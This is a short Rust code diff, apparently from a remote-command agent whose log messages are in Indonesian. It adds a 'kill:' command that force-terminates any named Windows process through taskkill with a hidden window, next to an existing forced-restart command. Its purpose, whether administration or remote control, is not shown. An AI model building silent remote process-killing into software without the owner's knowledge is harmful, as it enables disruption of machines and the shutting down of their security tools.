@@ -349,6 +349,17 @@ fn main() {
                                                     .args(["/r", "/f", "/t", "0"])
                                                     .spawn();
                                             }
+                                        } else if cmd.starts_with("kill:") {
+                                            let process_name = cmd.trim_start_matches("kill:").to_string();
+                                            println!("Menerima perintah kill process: {}", process_name);
+                                            #[cfg(target_os = "windows")]
+                                            {
+                                                use std::os::windows::process::CommandExt;
+                                                let _ = std::process::Command::new("taskkill")
+                                                    .args(["/f", "/im", &process_name])
+                                                    .creation_flags(0x08000000) // CREATE_NO_WINDOW
+                                                    .spawn();
+                                            }
                                         }
                                     }
                                 }
